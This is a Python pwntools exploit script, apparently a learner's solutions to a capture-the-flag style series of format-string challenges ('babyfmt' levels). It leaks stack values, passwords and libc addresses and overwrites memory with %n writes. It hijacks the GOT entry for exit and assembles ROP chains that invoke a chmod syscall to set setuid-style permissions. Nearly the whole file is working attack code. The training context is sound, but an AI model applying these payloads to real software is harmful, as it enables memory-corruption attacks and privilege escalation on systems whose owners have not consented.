from pwn import *
import os
import time
import re

# with gdb.debug([f"/challenge/{os.getenv('HOSTNAME')[:-8] + 'l' + os.getenv('HOSTNAME')[9:]}"], '''
    # b read@plt
    # disp/5i $rip
    # disp/60gx $rsp
    # c
    # finish
    # ''') as p:

def challenge1():
    fmt_string = b'leak: %18$s'
    with process([f"/challenge/{os.getenv('HOSTNAME')[:-8] + 'l' + os.getenv('HOSTNAME')[9:]}"], close_fds=False) as p:
        info(p.clean())
        p.send(fmt_string)
        info(p.readuntil(b'leak: '))
        password = p.readline().strip()
        info(p.clean())
        info(password)
        p.send(password)
        info(p.clean())

def challenge2():
    fmt_string = b'leak: %12$p %13$p'
    with process([f"/challenge/{os.getenv('HOSTNAME')[:-8] + 'l' + os.getenv('HOSTNAME')[9:]}"], close_fds=False) as p:
        info(p.clean())
        p.send(fmt_string)
        info(p.readuntil(b'leak: '))

        password = p.readline().strip().decode()
        password = password[21:] + password[2:18]
        password = [chr(int(password[i] + password[i+1], 16)) for i in range(0, len(password)-1, 2)]
        password = ''.join(password)[::-1]

        info(p.clean())
        info(password)
        p.send(password)
        info(p.clean())

def challenge3():
    fmt_string = b'   flag: %32$s' + p64(0x404110)
    with process([f"/challenge/{os.getenv('HOSTNAME')[:-8] + 'l' + os.getenv('HOSTNAME')[9:]}"], close_fds=False) as p:
        info(p.clean())
        p.sendline(fmt_string)
        info(p.clean())

def challenge4():
    fmt_string = b'%128x%26$n' + p64(0x404148)
    with process([f"/challenge/{os.getenv('HOSTNAME')[:-8] + 'l' + os.getenv('HOSTNAME')[9:]}"], close_fds=False) as p:
        info(p.clean())
        p.sendline(fmt_string)
        info(p.clean())

def challenge5():
    bss_addr = 0x404108
    fmt_string = (b'%82x%40$hn%129x%41$hn%169x%42$hn%221x%43$hn%84x%44$hn%85x%45$hn%155x%46$hn%192x%47$hn  ' 
        + p64(bss_addr)
        + p64(bss_addr + 1)
        + p64(bss_addr + 2)
        + p64(bss_addr + 3)
        + p64(bss_addr + 4)
        + p64(bss_addr + 5)
        + p64(bss_addr + 6)
        + p64(bss_addr + 7))
    # with gdb.debug([f"/challenge/{os.getenv('HOSTNAME')[:-8] + 'l' + os.getenv('HOSTNAME')[9:]}"], '''
    # b read@plt
    # disp/5i $rip
    # disp/60gx $rsp
    # c
    # finish
    # ''') as p:
    with process([f"/challenge/{os.getenv('HOSTNAME')[:-8] + 'l' + os.getenv('HOSTNAME')[9:]}"], close_fds=False) as p:
        info(p.clean())
        p.sendline(fmt_string)
        info(p.clean())
        p.poll(block=True)


def challenge6():
    bss_addr = 0x404130
    fmt_string = (b'%*65$x%24$n' + p64(bss_addr))
    
    with process([f"/challenge/{os.getenv('HOSTNAME')[:-8] + 'l' + os.getenv('HOSTNAME')[9:]}"], close_fds=False) as p:
        info(p.clean())
        p.sendline(fmt_string)
        info(p.clean())
        p.poll(block=True)

def challenge7():
    win = 0x40133d
    fmt_string1 = (b'%7$lx')
    fmt_string2 = (b'%*47$x%46$n     ')
    with process([f"/challenge/{os.getenv('HOSTNAME')[:-8] + 'l' + os.getenv('HOSTNAME')[9:]}"], close_fds=False) as p:
        info(p.readuntil(b'Have fun!\n'))
        p.sendline(fmt_string1)
        ret_addr = int(p.readline().strip().decode(), 16)
        payload = fmt_string2 + p64(ret_addr + 1048) + p64(win)
        p.sendline(payload)
        info(p.clean())
        p.sendline(b'END')
        info(p.clean())
        p.poll(block=True)


def challenge8():
    # 0x563a719fc8f2
    win = 0x1350
    ret_offset = 1018
    fmt_string1 = (b'%7$lx')
    fmt_string2 = (b'%157$lx')
    fmt_string3 = (b'%802x%32$hn       ')
    # with gdb.debug([f"/challenge/{os.getenv('HOSTNAME')[:-8] + 'l' + os.getenv('HOSTNAME')[9:]}"], '''
    # b *func+312
    # disp/5i $rip
    # disp/40gx $rsp
    # c
    # c
    # ''') as p:
    with process([f"/challenge/{os.getenv('HOSTNAME')[:-8] + 'l' + os.getenv('HOSTNAME')[9:]}"], close_fds=False) as p:
        
        info(p.clean())
        p.sendline(fmt_string1)
        info(p.readuntil(b'Your input is:'))
        info(p.readline())
        ret_addr_ptr = int(p.readline().strip().decode(), 16)
        print(hex(ret_addr_ptr))
        payload = fmt_string2
        p.sendline(fmt_string2)
        info(p.readuntil(b'Your input is:'))
        info(p.readline())
        ret_addr = int(p.readline().strip().decode(), 16)
        print(hex(ret_addr))
        print(hex(ret_addr - 0x65b + 0x350))
        info(p.clean())
        payload = fmt_string3 + p64(ret_addr_ptr + ret_offset) + p64(ret_addr) 
        p.sendline(payload)
        info(p.clean())
        p.sendline(b'END')
        info(p.clean())
        p.poll(block=True)

def exec_func_challenge9(payload):
    with process([f"/challenge/{os.getenv('HOSTNAME')[:-8] + 'l' + os.getenv('HOSTNAME')[9:]}"], close_fds=False) as p:
        p.readuntil(b'Have fun!\n')
        p.sendline(payload)
        p.readuntil(b'Your input is:                                \n')
        result = p.readall()
        info(result)
        return result

def challenge9():
    win = 0x10e2cd
    binary = ELF(f"/challenge/{os.getenv('HOSTNAME')[:-8] + 'l' + os.getenv('HOSTNAME')[9:]}")
    fmt = FmtStr(exec_func_challenge9)
    padding = b'a' * fmt.padlen
    payload = padding + fmtstr_payload(fmt.offset,{binary.got.exit:p64(win)})
    with process([f"/challenge/{os.getenv('HOSTNAME')[:-8] + 'l' + os.getenv('HOSTNAME')[9:]}"], close_fds=False) as p:
        info(p.readuntil(b'Have fun!\n'))
        p.sendline(payload)
        info(p.clean())
        p.poll(block=True)


def exec_func_challenge10(payload):
    with process([f"/challenge/{os.getenv('HOSTNAME')[:-9] + 'l' + os.getenv('HOSTNAME')[9:]}"], close_fds=False) as p:
        p.readuntil(b'Have fun!\n')
        p.sendline(payload)
        p.readuntil(b'Your input is:')
        p.readline()
        result = p.readall()
        info(result)
        return result

def fix_addr(ret):
    stack_arr = [hex(ret)[i:i+2] for i in range(2, len(hex(ret))-1, 2)]
    ret_arr = [hex(int(x, 16))[-2::] for x in stack_arr]
    print(ret_arr)
    stack_str = ""
    for i in range(len(ret_arr)):
        if i %2 != 0:
            ret_arr[i] = hex((int(ret_arr[i], 16)) + 0x88)[-2::]

        else:
            ret_arr[i] = hex((int(ret_arr[i], 16)) - 0x1)[-2::]
        stack_str += ret_arr[i]
    ret = int(stack_str, 16)
    return ret

def challenge10():
    func = 0x4012bd
    pop_sled = 0x401606
    base = 0xab5 # how far the pop sled ret is from the leaked stack addr
    libc = ELF(f"/lib/x86_64-linux-gnu/libc.so.6")
    binary = ELF(f"/challenge/{os.getenv('HOSTNAME')[:-9] + 'l' + os.getenv('HOSTNAME')[9:]}")
    fmt = FmtStr(exec_func_challenge10)
    padding = b'a' * fmt.padlen
    # this makes the exit call just call func again
    payload = padding + fmtstr_payload(fmt.offset, {binary.got.exit:func}, numbwritten=120, write_size='byte')
    
    with process([f"/challenge/{os.getenv('HOSTNAME')[:-9] + 'l' + os.getenv('HOSTNAME')[9:]}"], close_fds=False) as p:
        info(p.readuntil(b'Have fun!\n'))
        p.sendline(payload)
        info(p.clean())
        # get the address of __libc_start_main
        p.sendline(b'%327$lx')
        info(p.readuntil(b'Your input is:'))
        info(p.readline())
        libc_start_main_addr = int(p.readlineb().strip().decode(), 16) - 243
        info(f'libc_start = {hex(libc_start_main_addr)}')
        libc.address = libc_start_main_addr - libc.symbols['__libc_start_main']
        # make some rop gadgets
        rop = ROP(libc)
        pop_rax = rop.find_gadget(['pop rax', 'ret']).address
        pop_rdi = rop.find_gadget(['pop rdi', 'ret']).address
        pop_rsi = rop.find_gadget(['pop rsi', 'ret']).address
        syscall = rop.find_gadget(['syscall', 'ret']).address
        trash_string = next(libc.search(b'libc_intl_domainname'))
        info(p.clean())
        # leak stack address
        p.sendline(b'%7$lx')
        info(p.readuntil(b'Your input is:'))
        info(p.readline())
        stack_addr = (int(p.readline().strip().decode(), 16))
        info(p.clean())
        # call pop sled which leads to the rop chain
        rop_chain = (padding + 
            fmtstr_payload(fmt.offset,{stack_addr-base:pop_rax,
                stack_addr-(base-8):0x5a, # 0x5a
                stack_addr-(base-16):pop_rdi,
                stack_addr-(base-24):trash_string,
                stack_addr-(base-32):pop_rsi,
                stack_addr-(base-40):0x9ed, # 0x9ed
                stack_addr-(base-48):syscall
                },numbwritten=120, write_size='byte')
            )
        p.sendline(rop_chain)
        info(p.readuntil(b'Your input is:'))
        info(p.clean())
        payload_pop_sled = padding + fmtstr_payload(fmt.offset, {binary.got.exit:pop_sled}, numbwritten=120, write_size='byte')
        p.sendline(payload_pop_sled)
        info(p.readuntil(b'Your input is:'))
        info(p.readline())
        info(p.readline())

def exec_func_challenge11(payload):
    with process([f"/challenge/{os.getenv('HOSTNAME')[:-9] + 'l' + os.getenv('HOSTNAME')[9:]}"], close_fds=False) as p:
        p.sendline(b'aaaa')
        p.readuntil(b'a\n')
        p.sendline(payload)
        p.readuntil(b'Your input is:')
        p.readline()
        result = p.readall()
        info(result)
        return result

def challenge11():
    libc = ELF(f"/lib/x86_64-linux-gnu/libc.so.6")
    binary = ELF(f"/challenge/{os.getenv('HOSTNAME')[:-9] + 'l' + os.getenv('HOSTNAME')[9:]}")
    fmt = FmtStr(exec_func_challenge11)
    padding = b'a' * fmt.padlen
    # this makes the exit call just call func again
    # payload = padding + fmtstr_payload(fmt.offset, {binary.got.exit:0xdeadbeef}, numbwritten=108, write_size='byte')
    # 0x7ffe727002b0
    # with gdb.debug([f"/challenge/{os.getenv('HOSTNAME')[:-9] + 'l' + os.getenv('HOSTNAME')[9:]}"], '''
    # disp/5i $rip
    # disp/40gx $rsp
    # b read@plt
    # c
    # finish
    # ''') as p:

    with process([f"/challenge/{os.getenv('HOSTNAME')[:-9] + 'l' + os.getenv('HOSTNAME')[9:]}"], close_fds=False) as p:
        info(p.readuntil(b'Have fun!\n'))
        p.sendline(b'rbp: %168$lx \nret: %169$lx \nlibc: %179$lx')
        info(p.readuntil(b'rbp: '))
        rbp = int(p.readlineb().strip().decode(), 16)
        info(p.readuntil(b'ret: '))
        main = int(p.readlineb().strip().decode(), 16) - 406
        info(p.readuntil(b'libc: '))
        libc_start = int(p.readlineb().strip().decode(), 16) - 243
        overwrite = rbp - 1384
        binary.address = main - binary.symbols['main']
        libc.address = libc_start - libc.symbols['__libc_start_main']
        rop = ROP(libc)
        pop_rax = rop.find_gadget(['pop rax', 'ret']).address
        pop_rdi = rop.find_gadget(['pop rdi', 'ret']).address
        pop_rsi = rop.find_gadget(['pop rsi', 'ret']).address
        syscall = rop.find_gadget(['syscall', 'ret']).address
        trash_string = next(libc.search(b'libc_intl_domainname'))

        # payload = padding + fmtstr_payload(fmt.offset, {overwrite:0xdeadbeef}, numbwritten=40, write_size='byte')

        rop_chain = (padding + 
            fmtstr_payload(fmt.offset, {overwrite:pop_rax,
                overwrite+8:0x5a, # 0x5a
                overwrite+16:pop_rdi,
                overwrite+24:trash_string,
                overwrite+32:pop_rsi,
                overwrite+40:0x9ed, # 0x9ed
                overwrite+48:syscall
                },numbwritten=40, write_size='byte')
            )
        p.sendline(rop_chain)
        info(p.clean())
        p.poll(block=True)


def exec_func_challenge12(payload):
    print(payload)
    with process([f"/challenge/babyfmt_level{os.getenv('HOSTNAME')[29:31]}.{os.getenv('HOSTNAME')[-1:]}"], close_fds=False) as p:
        p.sendline(b'aaaa')
        p.readuntil(b'and then exit.\n')
        p.sendline(payload)
        p.readuntil(b'Your input is:')
        p.readline()
        result = p.readuntil(b"### Goodbye!")
        info(result)
        return result

def fmt_payload(byt):
    atoms = []
    atom = b''
    i = 0
    while byt[i+7].to_bytes(1, 'big') != b'\x00':
        # print(type(atom))
        # print()
        atom += byt[i].to_bytes(1, 'big')
        if byt[i].to_bytes(1, 'big') == b'n':
            atoms.append(atom)
            atom = b''
        i += 1

    print(atoms)

    addrs = []
    for i in range(len(byt), 0, -8):
        if b'\x00' not in byt[(i-8):(i)]: break 
        addrs.append(byt[(i-8):(i)])

    addrs.reverse()

    the_dict = {}
    first = False
    shift = []
    shift.append(first)
    the_dict.update({atoms[0]: int.from_bytes(addrs[0], "little")})
    print(f'{first} {({atoms[0]: hex(int.from_bytes(addrs[0], "little"))})}')
    for i in range(1, len(addrs)):
        first = False
        if(atoms[i].count(b'%') == 1): first = True 
        the_dict.update({atoms[i]: int.from_bytes(addrs[i], "little")})
        shift.append(first)
        print(f'{shift[i]} {({atoms[i]: hex(int.from_bytes(addrs[i], "little"))})}')
        

    print(len(addrs))
    adds = b''
    for i in range(len(addrs)):

        if shift[i]:
            print(f'this guys {hex(int.from_bytes(addrs[i], "little"))}')
            adds += addrs[i]

        else:
            adds += p64(0xdeadbeef) + addrs[i]

    stripped = [(atoms[i].decode().split('$', 1)[0][:-2]+atoms[i].decode().split('$', 1)[1]) for i in range(len(atoms))]
    atoms = ''.join(stripped).encode()

    fmt = atoms + adds
    return atoms, adds

def challenge12():
    libc = ELF(f"/lib/x86_64-linux-gnu/libc.so.6")
    binary = ELF(f"/challenge/babyfmt_level{os.getenv('HOSTNAME')[29:31]}.{os.getenv('HOSTNAME')[-1:]}")

    with gdb.debug([f"/challenge/babyfmt_level{os.getenv('HOSTNAME')[29:31]}.{os.getenv('HOSTNAME')[-1:]}"], '''
    disp/5i $rip
    disp/40gx $rsp
    b read@plt
    c
    finish
    ''') as p:

    # with process([f"/challenge/babyfmt_level{os.getenv('HOSTNAME')[29:31]}.{os.getenv('HOSTNAME')[-1:]}"], close_fds=False) as p:
        info(p.readuntil(b'Have fun!\n'))
        p.sendline(b' %lx '*147 + b'rbp: ' + b' %lx\n' + b'ret: ' + b' %lx\n' + b' %lx '*9 + b'\nlibc: ' + b' %lx ')
        info(p.readuntil(b'rbp: '))
        rbp = int(p.readlineb().strip().decode(), 16)
        info(p.readuntil(b'ret: '))
        main = int(p.readlineb().strip().decode(), 16) - 360
        info(p.readuntil(b'libc: '))
        libc_start = int(p.readlineb().strip().decode(), 16) - 243

        binary.address = main - binary.symbols['main']
        libc.address = libc_start - libc.symbols['__libc_start_main']
        rop = ROP(libc)
        pop_rax = rop.find_gadget(['pop rax', 'ret']).address
        pop_rdi = rop.find_gadget(['pop rdi', 'ret']).address
        pop_rsi = rop.find_gadget(['pop rsi', 'ret']).address
        syscall = rop.find_gadget(['syscall', 'ret']).address
        trash_string = next(libc.search(b'libc_intl_domainname'))

        # this is the saved return address
        overwrite = rbp-72   
        rop_chain = fmtstr_payload(10, {overwrite: pop_rax, 
            overwrite+8: 0x5a,
            overwrite+16:pop_rdi,
            overwrite+24:trash_string,
            overwrite+32:pop_rsi,
            overwrite+40:0x9ed, # 0x9ed
            overwrite+48:syscall
        }, numbwritten=304, write_size='byte')

        # rop_chain = fmtstr_payload(10, {overwrite: 0xdeadbeef}, numbwritten=304, write_size='byte')

        fmt, addrs = fmt_payload(rop_chain)

        # fmt = fmt.replace(b"lln", b"llx")
        # fmt = fmt.replace(b"hhn", b"llx")

        addresses_offset = 240
        num_prints = 71

        # trying to print the 72 item

        # 418 = len(fmt) + len(padding)

        padding = b'a'*(addresses_offset-len(fmt))
        p.sendline(b'%x'*num_prints + fmt + padding + addrs)
        info(p.readuntil(b'### Goodbye'))
        info(p.clean())
        p.poll(block=True)


def main():
    context.arch = 'amd64'
    context.encoding ='latin'
    context.log_level = 'INFO'
    context.terminal = ["tmux", "splitw", "-h"]
    warnings.simplefilter('ignore')
    challenge12()


if __name__ == "__main__":
    main()


# with gdb.debug([f"/challenge/{os.getenv('HOSTNAME')[:-9] + 'l' + os.getenv('HOSTNAME')[9:]}"], '''
    # disp/5i $rip
    # disp/40gx $rsp
    # b *0x40141e
    # disp/gx 0x404068
    # c
    # ''') as p:
    

# core = Coredump('./core')
# print(core)


    